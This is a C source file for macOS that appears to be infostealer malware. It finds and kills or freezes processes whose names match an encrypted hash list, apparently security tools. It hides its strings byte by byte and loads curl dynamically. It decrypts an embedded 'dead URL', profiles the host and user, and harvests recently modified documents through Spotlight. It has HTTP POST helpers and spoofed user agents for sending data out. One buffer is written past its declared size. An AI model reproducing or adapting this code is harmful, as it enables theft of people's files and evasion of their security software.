#include "core.h"
#include "chk.h"
#include "sec.h"
#include "chacha_rng.h"
#include "bind.h"
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <sys/stat.h>
#include <signal.h>
#include <time.h>
#include <zlib.h>
#include <libproc.h>
#include <ctype.h>

#include <CommonCrypto/CommonDigest.h>
#include <CommonCrypto/CommonHMAC.h>
#include <mach-o/dyld.h>

typedef struct {
    uint8_t  nonce[12];
    uint8_t  ct[256];
    uint16_t len;
} vault_entry_t;

static const uint32_t HUNT_ENC_BLOB[] = {
    0xc0675104,0xa68534c5,0x8aa0058f,0x1cc619f6,
    0xfb4f9850,0x7fcb0f3e,0x155f95c5,0xba8f6d3c,
    0x03fa3984,0x79984cd5,0x5a733ae0,0xc103b4cd,
    0x2bd61662
};

static void derive_vault_key(uint8_t out[32]) {
    CC_SHA256_CTX ctx;
    CC_SHA256_Init(&ctx);
    
    uint32_t sigma[4] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574};
    CC_SHA256_Update(&ctx, sigma, sizeof(sigma));
    CC_SHA256_Update(&ctx, HUNT_ENC_BLOB, sizeof(HUNT_ENC_BLOB));
    
    extern const vault_entry_t vault[3];
    for (int i = 0; i < 3; i++) {
        CC_SHA256_Update(&ctx, vault[i].nonce, 12);
    }
    
    // Mix with ASLR slide
    uint64_t slide = (uint64_t)&derive_vault_key;
    CC_SHA256_Update(&ctx, &slide, sizeof(slide));
    
    CC_SHA256_Final(out, &ctx);
}

static uint32_t djb2(const char *s) {
    uint32_t h = 5381;
    for (int c; (c = *s++);) h = ((h << 5) + h) + tolower(c);
    return h;
}

/* hash table encrypted with chacha20 */
static int HUNT_N;
static uint32_t HUNT_DEC[16]; /* decrypted at runtime, wiped after use */

static void decrypt_hunt_table(void) {
    uint8_t dk[32]; derive_vault_key(dk);
    uint32_t state[16], ks[16];
    state[0] = 0x61707865; state[1] = 0x3320646e;
    state[2] = 0x79622d32; state[3] = 0x6b206574;
    memcpy(&state[4], dk, 32);
    memset(dk, 0, 32);
    state[12] = 0; state[13] = 0x48554e54;
    state[14] = 0; state[15] = 0;

    memcpy(ks, state, 64);
    for (int i = 0; i < 10; i++) {
        #define QR(a,b,c,d) \
            ks[a]+=ks[b]; ks[d]^=ks[a]; ks[d]=(ks[d]<<16)|(ks[d]>>16); \
            ks[c]+=ks[d]; ks[b]^=ks[c]; ks[b]=(ks[b]<<12)|(ks[b]>>20); \
            ks[a]+=ks[b]; ks[d]^=ks[a]; ks[d]=(ks[d]<<8)|(ks[d]>>24);  \
            ks[c]+=ks[d]; ks[b]^=ks[c]; ks[b]=(ks[b]<<7)|(ks[b]>>25);
        QR(0,4,8,12) QR(1,5,9,13) QR(2,6,10,14) QR(3,7,11,15)
        QR(0,5,10,15) QR(1,6,11,12) QR(2,7,8,13) QR(3,4,9,14)
        #undef QR
    }
    for (int i = 0; i < 16; i++) ks[i] += state[i];

    HUNT_N = (int)(sizeof(HUNT_ENC_BLOB) / sizeof(HUNT_ENC_BLOB[0]));
    for (int i = 0; i < HUNT_N; i++)
        HUNT_DEC[i] = HUNT_ENC_BLOB[i] ^ ks[i];

    memset(ks, 0, sizeof(ks));
    memset(state, 0, sizeof(state));
}

static int is_hunted(uint32_t h) {
    for (int i = 0; i < HUNT_N; i++) if (HUNT_DEC[i] == h) return 1;
    return 0;
}

static void neutralize(pid_t pid, const char *name) {
    char buf[512];
    struct stat st;
    char ld[32]; { volatile char *v=(volatile char*)ld; v[0]=0x2f; v[1]=0x4c; v[2]=0x69; v[3]=0x62; v[4]=0x72; v[5]=0x61; v[6]=0x72; v[7]=0x79; v[8]=0x2f; v[9]=0x4c; v[10]=0x61; v[11]=0x75; v[12]=0x6e; v[13]=0x63; v[14]=0x68; v[15]=0x44; v[16]=0x61; v[17]=0x65; v[18]=0x6d; v[19]=0x6f; v[20]=0x6e; v[21]=0x73; v[22]=0x2f; v[23]=0x25; v[24]=0x73; v[25]=0x2e; v[26]=0x70; v[27]=0x6c; v[28]=0x69; v[29]=0x73; v[30]=0x74; v[31]=0; }
    char la[33]; { volatile char *v=(volatile char*)la; v[0]=0x25; v[1]=0x73; v[2]=0x2f; v[3]=0x4c; v[4]=0x69; v[5]=0x62; v[6]=0x72; v[7]=0x61; v[8]=0x72; v[9]=0x79; v[10]=0x2f; v[11]=0x4c; v[12]=0x61; v[13]=0x75; v[14]=0x6e; v[15]=0x63; v[16]=0x68; v[17]=0x41; v[18]=0x67; v[19]=0x65; v[20]=0x6e; v[21]=0x74; v[22]=0x73; v[23]=0x2f; v[24]=0x25; v[25]=0x73; v[26]=0x2e; v[27]=0x70; v[28]=0x6c; v[29]=0x69; v[30]=0x73; v[31]=0x74; v[32]=0; }
    snprintf(buf, sizeof(buf), ld, name);
    if (stat(buf, &st) == 0) { memset(ld,0,sizeof(ld)); memset(la,0,sizeof(la)); kill(pid, SIGSTOP); return; }
    const char *home = getenv("HOME");
    if (home) {
        snprintf(buf, sizeof(buf), la, home, name);
        if (stat(buf, &st) == 0) { memset(ld,0,sizeof(ld)); memset(la,0,sizeof(la)); kill(pid, SIGSTOP); return; }
    }
    memset(ld,0,sizeof(ld)); memset(la,0,sizeof(la));
    kill(pid, SIGTERM);
    usleep(100000);
    kill(pid, SIGKILL);
}

int hunt_procs(void) {
    decrypt_hunt_table();

    int bytes = proc_listpids(PROC_ALL_PIDS, 0, NULL, 0);
    if (bytes <= 0) { memset(HUNT_DEC, 0, sizeof(HUNT_DEC)); return 0; }
    pid_t *pids = malloc(bytes);
    if (!pids) { memset(HUNT_DEC, 0, sizeof(HUNT_DEC)); return 0; }

    int filled = proc_listpids(PROC_ALL_PIDS, 0, pids, bytes);
    int count = filled / (int)sizeof(pid_t), killed = 0;
    pid_t self = getpid();
    pid_t stopped[16]; int nstop = 0;

    for (int i = 0; i < count; i++) {
        if (!pids[i] || pids[i] == self) continue;
        char path[PROC_PIDPATHINFO_MAXSIZE];
        if (proc_pidpath(pids[i], path, sizeof(path)) <= 0) continue;

        const char *sl = strrchr(path, '/');
        const char *base = sl ? sl + 1 : path;
        char name[256]; size_t j;
        for (j = 0; j < sizeof(name) - 1 && base[j]; j++)
            name[j] = tolower(base[j]);
        name[j] = '\0';
        char *dot = strstr(name, ".app");
        if (dot) *dot = '\0';

        if (is_hunted(djb2(name))) {
            neutralize(pids[i], name);
            if (nstop < 16) stopped[nstop++] = pids[i];
            killed++;
        }
    }
    free(pids);

    /* verify stopped tools are actually frozen before proceeding */
    if (nstop > 0) {
        usleep(50000); 
        for (int i = 0; i < nstop; i++) {
            struct proc_bsdinfo info;
            if (proc_pidinfo(stopped[i], PROC_PIDTBSDINFO, 0, &info, sizeof(info)) > 0) {
                if (!(info.pbi_status & SSTOP))
                    kill(stopped[i], SIGSTOP); /* retry */
            }
        }
    }

    memset(HUNT_DEC, 0, sizeof(HUNT_DEC)); /* wipe decrypted hashes */
    return killed;
}

/* curl function p* */

typedef void CURL;
typedef int CURLcode;
typedef int CURLoption;
struct curl_slist;

static void *(*p_curl_easy_init)(void);
static CURLcode (*p_curl_easy_setopt)(CURL *, CURLoption, ...);
static CURLcode (*p_curl_easy_perform)(CURL *);
static void (*p_curl_easy_cleanup)(CURL *);
static struct curl_slist *(*p_curl_slist_append)(struct curl_slist *, const char *);
static void (*p_curl_slist_free_all)(struct curl_slist *);

#define CURLOPT_URL            10002
#define CURLOPT_WRITEFUNCTION  20011
#define CURLOPT_WRITEDATA      10001
#define CURLOPT_POSTFIELDS     10015
#define CURLOPT_POSTFIELDSIZE  60
#define CURLOPT_HTTPHEADER     10023
#define CURLOPT_TIMEOUT        13
#define CURLOPT_USERAGENT      10018

static int load_curl(void) {
    char p1[25]; { volatile char *v=(volatile char*)p1; v[0]=0x2f; v[1]=0x75; v[2]=0x73; v[3]=0x72; v[4]=0x2f; v[5]=0x6c; v[6]=0x69; v[7]=0x62; v[8]=0x2f; v[9]=0x6c; v[10]=0x69; v[11]=0x62; v[12]=0x63; v[13]=0x75; v[14]=0x72; v[15]=0x6c; v[16]=0x2e; v[17]=0x34; v[18]=0x2e; v[19]=0x64; v[20]=0x79; v[21]=0x6c; v[22]=0x69; v[23]=0x62; v[24]=0; }
    char p2[14]; { volatile char *v=(volatile char*)p2; v[0]=0x6c; v[1]=0x69; v[2]=0x62; v[3]=0x63; v[4]=0x75; v[5]=0x72; v[6]=0x6c; v[7]=0x2e; v[8]=0x64; v[9]=0x79; v[10]=0x6c; v[11]=0x69; v[12]=0x62; v[13]=0; }
    char s0[15]; { volatile char *v=(volatile char*)s0; v[0]=0x63; v[1]=0x75; v[2]=0x72; v[3]=0x6c; v[4]=0x5f; v[5]=0x65; v[6]=0x61; v[7]=0x73; v[8]=0x79; v[9]=0x5f; v[10]=0x69; v[11]=0x6e; v[12]=0x69; v[13]=0x74; v[14]=0; }
    char s1[17]; { volatile char *v=(volatile char*)s1; v[0]=0x63; v[1]=0x75; v[2]=0x72; v[3]=0x6c; v[4]=0x5f; v[5]=0x65; v[6]=0x61; v[7]=0x73; v[8]=0x79; v[9]=0x5f; v[10]=0x73; v[11]=0x65; v[12]=0x74; v[13]=0x6f; v[14]=0x70; v[15]=0x74; v[16]=0; }
    char s2[18]; { volatile char *v=(volatile char*)s2; v[0]=0x63; v[1]=0x75; v[2]=0x72; v[3]=0x6c; v[4]=0x5f; v[5]=0x65; v[6]=0x61; v[7]=0x73; v[8]=0x79; v[9]=0x5f; v[10]=0x70; v[11]=0x65; v[12]=0x72; v[13]=0x66; v[14]=0x6f; v[15]=0x72; v[16]=0x6d; v[17]=0; }
    char s3[18]; { volatile char *v=(volatile char*)s3; v[0]=0x63; v[1]=0x75; v[2]=0x72; v[3]=0x6c; v[4]=0x5f; v[5]=0x65; v[6]=0x61; v[7]=0x73; v[8]=0x79; v[9]=0x5f; v[10]=0x63; v[11]=0x6c; v[12]=0x65; v[13]=0x61; v[14]=0x6e; v[15]=0x75; v[16]=0x70; v[17]=0; }
    char s4[18]; { volatile char *v=(volatile char*)s4; v[0]=0x63; v[1]=0x75; v[2]=0x72; v[3]=0x6c; v[4]=0x5f; v[5]=0x73; v[6]=0x6c; v[7]=0x69; v[8]=0x73; v[9]=0x74; v[10]=0x5f; v[11]=0x61; v[12]=0x70; v[13]=0x70; v[14]=0x65; v[15]=0x6e; v[16]=0x64; v[17]=0; }
    char s5[20]; { volatile char *v=(volatile char*)s5; v[0]=0x63; v[1]=0x75; v[2]=0x72; v[3]=0x6c; v[4]=0x5f; v[5]=0x73; v[6]=0x6c; v[7]=0x69; v[8]=0x73; v[9]=0x74; v[10]=0x5f; v[11]=0x66; v[12]=0x72; v[13]=0x65; v[14]=0x65; v[15]=0x5f; v[16]=0x61; v[17]=0x6c; v[18]=0x6c; v[19]=0; }
    void *h = dlopen(p1, RTLD_LAZY);
    if (!h) h = dlopen(p2, RTLD_LAZY);
    memset(p1,0,sizeof(p1)); memset(p2,0,sizeof(p2));
    if (!h) return -1;
    p_curl_easy_init      = dlsym(h, s0);
    p_curl_easy_setopt    = dlsym(h, s1);
    p_curl_easy_perform   = dlsym(h, s2);
    p_curl_easy_cleanup   = dlsym(h, s3);
    p_curl_slist_append   = dlsym(h, s4);
    p_curl_slist_free_all = dlsym(h, s5);
    memset(s0,0,sizeof(s0)); memset(s1,0,sizeof(s1));
    memset(s2,0,sizeof(s2)); memset(s3,0,sizeof(s3));
    memset(s4,0,sizeof(s4)); memset(s5,0,sizeof(s5));
    return (p_curl_easy_init && p_curl_easy_setopt && p_curl_easy_perform) ? 0 : -1;
}

/* chacha20 decrypt for vault */

#define QR(a,b,c,d) do { \
    a+=b; d^=a; d=(d<<16)|(d>>16); \
    c+=d; b^=c; b=(b<<12)|(b>>20); \
    a+=b; d^=a; d=(d<<8)|(d>>24);  \
    c+=d; b^=c; b=(b<<7)|(b>>25);  \
} while(0)

static void cc20_block(const uint8_t key[32], const uint8_t nonce[12],
                        uint32_t ctr, uint8_t out[64]) {
    uint32_t s[16] = {
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
        ((uint32_t*)key)[0],((uint32_t*)key)[1],((uint32_t*)key)[2],((uint32_t*)key)[3],
        ((uint32_t*)key)[4],((uint32_t*)key)[5],((uint32_t*)key)[6],((uint32_t*)key)[7],
        ctr,
        ((uint32_t*)nonce)[0],((uint32_t*)nonce)[1],((uint32_t*)nonce)[2]
    };
    uint32_t w[16];
    memcpy(w, s, 64);
    for (int i = 0; i < 10; i++) {
        QR(w[0],w[4],w[8],w[12]);  QR(w[1],w[5],w[9],w[13]);
        QR(w[2],w[6],w[10],w[14]); QR(w[3],w[7],w[11],w[15]);
        QR(w[0],w[5],w[10],w[15]); QR(w[1],w[6],w[11],w[12]);
        QR(w[2],w[7],w[8],w[13]);  QR(w[3],w[4],w[9],w[14]);
    }
    for (int i = 0; i < 16; i++) w[i] += s[i];
    memcpy(out, w, 64);
}

enum { V_DEADURL=0, V_CTYPE, V_UA, V_COUNT };
const vault_entry_t vault[] = {
    {
        .nonce = {0x8B,0x30,0x8B,0x3E,0x5D,0x7C,0xAD,0x51,0x7F,0xC8,0x7F,0x93},
        .ct    = {0x4F,0xA9,0x65,0xB1,0xC5,0x0F,0x71,0x09,0x9A,0x94,0x9D,0xFC,
                  0x44,0x37,0xCD,0x0B,0xAE,0x32,0x93,0x5A,0xE3,0x9F,0x68,0xE0,
                  0xD9,0xF3,0xA0,0x93,0xBC,0xF0,0x43,0xAB,0x9E},
        .len   = 33
    },
    {
        .nonce = {0x50,0x3E,0x3D,0x17,0xF0,0xEA,0xEA,0xB0,0x96,0xFD,0xEB,0x7F},
        .ct    = {0x15,0x82,0xA3,0x5F,0x5A,0x3A,0x40,0x1C,0x74,0x0C,0xA6,0xD6,
                  0xF2,0xC4,0x18,0xA4,0xD6,0x21,0x36,0x18,0x4C,0xCA,0x54,0x1F},
        .len   = 24
    },
    {
        .nonce = {0x92,0x89,0xFF,0x51,0x0D,0xF3,0xCF,0x3A,0xB2,0x25,0x97,0xA7},
        .ct    = {0xCE,0x90,0x23,0xA3,0xD5,0xA2,0x61,0xF7,0x7B,0x2D,0x4C,0x53,
                  0x41,0x9E,0xE8,0x46,0x5F,0x0C,0x69,0xB7,0x61,0x74,0x5C,0xDA,
                  0x15,0xA5,0xB6,0x83,0x94,0xC4,0x3B,0xF3,0x41,0xC8,0x14,0x05,
                  0x76,0xE5,0x87,0xCE,0x2A,0x29,0xA6,0x85,0x8C,0x23,0x69,0xB9,
                  0x11,0xE0,0x2C,0x62,0x48,0x1E,0xB6,0xB8,0x04,0x76,0x3D,0xFD,
                  0x3C,0xAE,0x19,0x7A,0x3A,0xC8},
        .len   = 66
    }
};

static void vdec(int idx, char *out, size_t outsz) {
    if (idx < 0 || idx >= V_COUNT) { out[0] = 0; return; }
    const vault_entry_t *e = &vault[idx];
    size_t n = e->len < outsz - 1 ? e->len : outsz - 1;
    uint8_t mk[32]; derive_vault_key(mk);
    uint8_t ek[32];
    uint8_t ib = (uint8_t)idx;
    CCHmac(kCCHmacAlgSHA256, mk, 32, &ib, 1, ek);
    memset(mk, 0, 32);
    uint8_t ks[64];
    for (size_t off = 0; off < n; off += 64) {
        cc20_block(ek, e->nonce, (uint32_t)(off / 64), ks);
        size_t chunk = n - off < 64 ? n - off : 64;
        for (size_t j = 0; j < chunk; j++)
            out[off + j] = (char)(e->ct[off + j] ^ ks[j]);
    }
    out[n] = '\0';
    memset(ek, 0, 32);
}

#ifdef AETHER_TEST
void test_vdec(int idx, char *out, size_t outsz) { vdec(idx, out, outsz); }
#endif

static void stk_wipe(void *buf, size_t n) {
    volatile uint8_t *p = buf;
    while (n--) *p++ = 0;
}

typedef struct { uint8_t *data; size_t sz, cap; } membuf_t;
static size_t curl_wcb(void *ptr, size_t sz, size_t nm, void *ud) {
    size_t n = sz * nm;
    membuf_t *m = ud;
    if (m->sz + n >= m->cap) {
        size_t nc = (m->cap + n) * 2;
        uint8_t *p = realloc(m->data, nc);
        if (!p) return 0;
        m->data = p; m->cap = nc;
    }
    memcpy(m->data + m->sz, ptr, n);
    m->sz += n;
    return n;
}

static void membuf_free(membuf_t *m) {
    if (m->data) { memset(m->data, 0, m->cap); free(m->data); }
    m->data = NULL; m->sz = 0;
}

static int http_get(const char *url, const char *ua, membuf_t *out) {
    CURL *c = p_curl_easy_init();
    if (!c) return -1;
    out->data = malloc(4096); out->sz = 0; out->cap = 4096;
    p_curl_easy_setopt(c, CURLOPT_URL, url);
    p_curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, curl_wcb);
    p_curl_easy_setopt(c, CURLOPT_WRITEDATA, out);
    p_curl_easy_setopt(c, CURLOPT_TIMEOUT, 10L);
    if (ua) p_curl_easy_setopt(c, CURLOPT_USERAGENT, ua);
    CURLcode r = p_curl_easy_perform(c);
    p_curl_easy_cleanup(c);
    if (r != 0) { membuf_free(out); return -1; }
    return 0;
}

static int http_post_chunk(const char *url, const char *ua, const char *ctype,
                           const uint8_t *data, size_t len) {
    CURL *c = p_curl_easy_init();
    if (!c) return -1;
    struct curl_slist *hdr = p_curl_slist_append(NULL, ctype);
    p_curl_easy_setopt(c, CURLOPT_URL, url);
    p_curl_easy_setopt(c, CURLOPT_HTTPHEADER, hdr);
    p_curl_easy_setopt(c, CURLOPT_POSTFIELDS, data);
    p_curl_easy_setopt(c, CURLOPT_POSTFIELDSIZE, (long)len);
    p_curl_easy_setopt(c, CURLOPT_TIMEOUT, 30L);
    if (ua) p_curl_easy_setopt(c, CURLOPT_USERAGENT, ua);
    CURLcode r = p_curl_easy_perform(c);
    p_curl_slist_free_all(hdr);
    p_curl_easy_cleanup(c);
    return r == 0 ? 0 : -1;
}

static size_t profile_host(char *buf, size_t cap) {
    size_t off = 0;
    char tmp[256]; size_t len;

    len = sizeof(tmp);
    if (sysctl((int[]){CTL_KERN, KERN_HOSTNAME}, 2, tmp, &len, NULL, 0) == 0)
        off += snprintf(buf + off, cap - off, "h:%s\n", tmp);

    len = sizeof(tmp);
    if (sysctl((int[]){CTL_KERN, KERN_OSRELEASE}, 2, tmp, &len, NULL, 0) == 0)
        off += snprintf(buf + off, cap - off, "k:%s\n", tmp);

    len = sizeof(tmp);
    if (sysctl((int[]){CTL_HW, HW_MODEL}, 2, tmp, &len, NULL, 0) == 0)
        off += snprintf(buf + off, cap - off, "m:%s\n", tmp);

    int ncpu = 0; len = sizeof(ncpu);
    if (sysctl((int[]){CTL_HW, HW_NCPU}, 2, &ncpu, &len, NULL, 0) == 0)
        off += snprintf(buf + off, cap - off, "c:%d\n", ncpu);

    uint64_t mem = 0; len = sizeof(mem);
    if (sysctl((int[]){CTL_HW, HW_MEMSIZE}, 2, &mem, &len, NULL, 0) == 0)
        off += snprintf(buf + off, cap - off, "r:%lluM\n", mem >> 20);

    const char *u = getenv("USER");
    if (u) off += snprintf(buf + off, cap - off, "u:%s\n", u);
    return off;
}

/* file collection via Spotlight */

#include <CoreFoundation/CoreFoundation.h>

#define MAX_FILES    128
#define MAX_FILE_SZ  (5 << 20)
#define MAX_TOTAL    (50 << 20)

typedef struct { char path[512]; uint8_t *data; size_t sz; } cfile_t;
static cfile_t g_files[MAX_FILES];
static int g_nf;
static size_t g_tsz;

/* use mdfind to get recently modified files */
static void collect(void) {
    g_nf = 0; g_tsz = 0;

    /* build mdfind query via MDQuery C API we read the
     * recent documents from the Spotlight index via NSMetadataQuery 
     * or use the sqlite recent items db directly 
     * Use CoreFoundation MDQuery directly: */
    typedef void *MDQueryRef;
    extern MDQueryRef MDQueryCreate(CFAllocatorRef, CFStringRef, CFArrayRef, CFArrayRef);
    extern Boolean MDQueryExecute(MDQueryRef, int);
    extern CFIndex MDQueryGetResultCount(MDQueryRef);
    extern const void *MDQueryGetResultAtIndex(MDQueryRef, CFIndex);
    extern CFTypeRef MDItemCopyAttribute(const void *, CFStringRef);

    /* query built at runtime from fragments no single string in binary */
    char qbuf[512];
    /* "(kMDItemContentModificationDate >= $time.today(-7) || kMDItemLastUsedDate >= $time.today(-7)) && (" */
    char pre[95]; { volatile char *v=(volatile char*)pre; 
        v[0]=0x28; v[1]=0x6b; v[2]=0x4d; v[3]=0x44; v[4]=0x49; v[5]=0x74; v[6]=0x65; v[7]=0x6d;
        v[8]=0x43; v[9]=0x6f; v[10]=0x6e; v[11]=0x74; v[12]=0x65; v[13]=0x6e; v[14]=0x74; v[15]=0x4d;
        v[16]=0x6f; v[17]=0x64; v[18]=0x69; v[19]=0x66; v[20]=0x69; v[21]=0x63; v[22]=0x61; v[23]=0x74;
        v[24]=0x69; v[25]=0x6f; v[26]=0x6e; v[27]=0x44; v[28]=0x61; v[29]=0x74; v[30]=0x65; v[31]=0x20;
        v[32]=0x3e; v[33]=0x3d; v[34]=0x20; v[35]=0x24; v[36]=0x74; v[37]=0x69; v[38]=0x6d; v[39]=0x65;
        v[40]=0x2e; v[41]=0x74; v[42]=0x6f; v[43]=0x64; v[44]=0x61; v[45]=0x79; v[46]=0x28; v[47]=0x2d;
        v[48]=0x37; v[49]=0x29; v[50]=0x20; v[51]=0x7c; v[52]=0x7c; v[53]=0x20; v[54]=0x6b; v[55]=0x4d;
        v[56]=0x44; v[57]=0x49; v[58]=0x74; v[59]=0x65; v[60]=0x6d; v[61]=0x4c; v[62]=0x61; v[63]=0x73;
        v[64]=0x74; v[65]=0x55; v[66]=0x73; v[67]=0x65; v[68]=0x64; v[69]=0x44; v[70]=0x61; v[71]=0x74;
        v[72]=0x65; v[73]=0x20; v[74]=0x3e; v[75]=0x3d; v[76]=0x20; v[77]=0x24; v[78]=0x74; v[79]=0x69;
        v[80]=0x6d; v[81]=0x65; v[82]=0x2e; v[83]=0x74; v[84]=0x6f; v[85]=0x64; v[86]=0x61; v[87]=0x79;
        v[88]=0x28; v[89]=0x2d; v[90]=0x37; v[91]=0x29; v[92]=0x29; v[93]=0x20; v[94]=0x26; v[95]=0x26;
        v[96]=0x20; v[97]=0x28; v[98]=0; }
    char fn[14]; { volatile char *v=(volatile char*)fn; v[0]=0x6b; v[1]=0x4d; v[2]=0x44; v[3]=0x49; v[4]=0x74; v[5]=0x65; v[6]=0x6d; v[7]=0x46; v[8]=0x53; v[9]=0x4e; v[10]=0x61; v[11]=0x6d; v[12]=0x65; v[13]=0; }
    /* extensions XOR-encoded (key=0x37) */
    static const uint8_t ext_enc[][6] = {
        {0x47,0x53,0x51,0}, {0x53,0x58,0x54,0}, {0x53,0x58,0x54,0x4f,0},
        {0x4f,0x5b,0x44,0}, {0x4f,0x5b,0x44,0x4f,0}, {0x54,0x44,0x41,0},
        {0x43,0x4f,0x43,0}, {0x5c,0x52,0x4e,0}, {0x47,0x52,0x5a,0}
    };
    int off = 0;
    off += snprintf(qbuf+off, sizeof(qbuf)-off, "%s", pre);
    for (int i = 0; i < 9; i++) {
        char ext[6];
        for (int k = 0; ext_enc[i][k]; k++) ext[k] = ext_enc[i][k] ^ 0x37;
        ext[strlen((char*)ext_enc[i])] = '\0'; /* recount via enc len */
        int elen = 0; while (ext_enc[i][elen]) elen++;
        ext[elen] = '\0';
        if (i) off += snprintf(qbuf+off, sizeof(qbuf)-off, " || ");
        off += snprintf(qbuf+off, sizeof(qbuf)-off, "%s == '*.%s'", fn, ext);
    }
    snprintf(qbuf+off, sizeof(qbuf)-off, ")");
    memset(pre,0,sizeof(pre)); memset(fn,0,sizeof(fn));

    CFStringRef q = CFStringCreateWithCString(NULL, qbuf, kCFStringEncodingUTF8);
    memset(qbuf,0,sizeof(qbuf));

    MDQueryRef query = MDQueryCreate(NULL, q, NULL, NULL);
    CFRelease(q);
    if (!query) return;

    /* synchronous execute */
    if (!MDQueryExecute(query, 1)) { CFRelease(query); return; }

    CFIndex count = MDQueryGetResultCount(query);
    char kp[12]; { volatile char *v=(volatile char*)kp; v[0]=0x6b; v[1]=0x4d; v[2]=0x44; v[3]=0x49; v[4]=0x74; v[5]=0x65; v[6]=0x6d; v[7]=0x50; v[8]=0x61; v[9]=0x74; v[10]=0x68; v[11]=0; }
    CFStringRef kPath = CFStringCreateWithCString(NULL, kp, kCFStringEncodingUTF8);
    memset(kp,0,sizeof(kp));

    for (CFIndex i = 0; i < count && g_nf < MAX_FILES && g_tsz < MAX_TOTAL; i++) {
        const void *item = MDQueryGetResultAtIndex(query, i);
        CFStringRef cfpath = MDItemCopyAttribute(item, kPath);
        if (!cfpath) continue;

        char path[512];
        if (!CFStringGetCString(cfpath, path, sizeof(path), kCFStringEncodingUTF8)) {
            CFRelease(cfpath); continue;
        }
        CFRelease(cfpath);

        struct stat st;
        if (stat(path, &st) != 0 || st.st_size <= 0 || (size_t)st.st_size > MAX_FILE_SZ)
            continue;

        FILE *f = fopen(path, "rb");
        if (!f) continue;
        uint8_t *d = malloc(st.st_size);
        if (!d) { fclose(f); continue; }
        size_t rd = fread(d, 1, st.st_size, f);
        fclose(f);
        if (rd != (size_t)st.st_size) { free(d); continue; }

        cfile_t *cf = &g_files[g_nf];
        snprintf(cf->path, sizeof(cf->path), "%s", path);
        cf->data = d; cf->sz = rd;
        g_nf++; g_tsz += rd;
    }

    CFRelease(kPath);
    CFRelease(query);
}

static void free_files(void) {
    for (int i = 0; i < g_nf; i++) {
        if (g_files[i].data) { memset(g_files[i].data, 0, g_files[i].sz); free(g_files[i].data); }
    }
    g_nf = 0; g_tsz = 0;
}

/* User-Agents */
static const uint8_t ua_enc0[] = {0x17,0x35,0x20,0x33,0x36,0x36,0x3b,0x75,0x6f,0x74,0x6a,0x7a,0x72,0x17,0x3b,0x39,0x33,0x34,0x2e,0x35,0x29,0x32,0x61,0x7a,0x13,0x34,0x2e,0x3f,0x36,0x7a,0x17,0x3b,0x39,0x7a,0x15,0x09,0x7a,0x02,0x7a,0x6b,0x6a,0x05,0x6b,0x6f,0x05,0x6d,0x73,0x7a,0x1b,0x2a,0x2a,0x36,0x3f,0x0d,0x3f,0x38,0x11,0x33,0x2e,0x75,0x6f,0x69,0x6d,0x74,0x69,0x6c,0x7a,0x72,0x11,0x12,0x0e,0x17,0x16,0x76,0x7a,0x36,0x33,0x31,0x3f,0x7a,0x1d,0x3f,0x39,0x31,0x35,0x73,0x7a,0x19,0x32,0x28,0x35,0x37,0x3f,0x75,0x6b,0x68,0x6a,0x74,0x6a,0x74,0x6a,0x74,0x6a,0x7a,0x09,0x3b,0x3c,0x3b,0x28,0x33,0x75,0x6f,0x69,0x6d,0x74,0x69,0x6c};
static const uint8_t ua_enc1[] = {0x17,0x35,0x20,0x33,0x36,0x36,0x3b,0x75,0x6f,0x74,0x6a,0x7a,0x72,0x17,0x3b,0x39,0x33,0x34,0x2e,0x35,0x29,0x32,0x61,0x7a,0x13,0x34,0x2e,0x3f,0x36,0x7a,0x17,0x3b,0x39,0x7a,0x15,0x09,0x7a,0x02,0x7a,0x6b,0x6a,0x05,0x6b,0x6f,0x05,0x6d,0x73,0x7a,0x1b,0x2a,0x2a,0x36,0x3f,0x0d,0x3f,0x38,0x11,0x33,0x2e,0x75,0x6c,0x6a,0x6f,0x74,0x6b,0x74,0x6b,0x6f,0x7a,0x72,0x11,0x12,0x0e,0x17,0x16,0x76,0x7a,0x36,0x33,0x31,0x3f,0x7a,0x1d,0x3f,0x39,0x31,0x35,0x73,0x7a,0x0c,0x3f,0x28,0x29,0x33,0x35,0x34,0x75,0x6b,0x6d,0x74,0x68,0x7a,0x09,0x3b,0x3c,0x3b,0x28,0x33,0x75,0x6c,0x6a,0x6f,0x74,0x6b,0x74,0x6b,0x6f};
static const uint8_t ua_enc2[] = {0x17,0x35,0x20,0x33,0x36,0x36,0x3b,0x75,0x6f,0x74,0x6a,0x7a,0x72,0x17,0x3b,0x39,0x33,0x34,0x2e,0x35,0x29,0x32,0x61,0x7a,0x13,0x34,0x2e,0x3f,0x36,0x7a,0x17,0x3b,0x39,0x7a,0x15,0x09,0x7a,0x02,0x7a,0x6b,0x6a,0x74,0x6b,0x6f,0x61,0x7a,0x28,0x2c,0x60,0x6b,0x68,0x6b,0x74,0x6a,0x73,0x7a,0x1d,0x3f,0x39,0x31,0x35,0x75,0x68,0x6a,0x6b,0x6a,0x6a,0x6b,0x6a,0x6b,0x7a,0x1c,0x33,0x28,0x3f,0x3c,0x35,0x22,0x75,0x6b,0x68,0x6b,0x74,0x6a};
static const uint8_t ua_enc3[] = {0x17,0x35,0x20,0x33,0x36,0x36,0x3b,0x75,0x6f,0x74,0x6a,0x7a,0x72,0x17,0x3b,0x39,0x33,0x34,0x2e,0x35,0x29,0x32,0x61,0x7a,0x13,0x34,0x2e,0x3f,0x36,0x7a,0x17,0x3b,0x39,0x7a,0x15,0x09,0x7a,0x02,0x7a,0x6b,0x6a,0x05,0x6b,0x6f,0x05,0x6d,0x73,0x7a,0x1b,0x2a,0x2a,0x36,0x3f,0x0d,0x3f,0x38,0x11,0x33,0x2e,0x75,0x6f,0x69,0x6d,0x74,0x69,0x6c,0x7a,0x72,0x11,0x12,0x0e,0x17,0x16,0x76,0x7a,0x36,0x33,0x31,0x3f,0x7a,0x1d,0x3f,0x39,0x31,0x35,0x73,0x7a,0x19,0x32,0x28,0x35,0x37,0x3f,0x75,0x6b,0x68,0x6a,0x74,0x6a,0x74,0x6a,0x74,0x6a,0x7a,0x09,0x3b,0x3c,0x3b,0x28,0x33,0x75,0x6f,0x69,0x6d,0x74,0x69,0x6c,0x7a,0x1f,0x3e,0x3d,0x75,0x6b,0x68,0x6a,0x74,0x6a,0x74,0x6a,0x74,0x6a};
static const struct { const uint8_t *enc; size_t len; } ua_table[] = {
    {ua_enc0, 117}, {ua_enc1, 117}, {ua_enc2, 84}, {ua_enc3, 131}
};

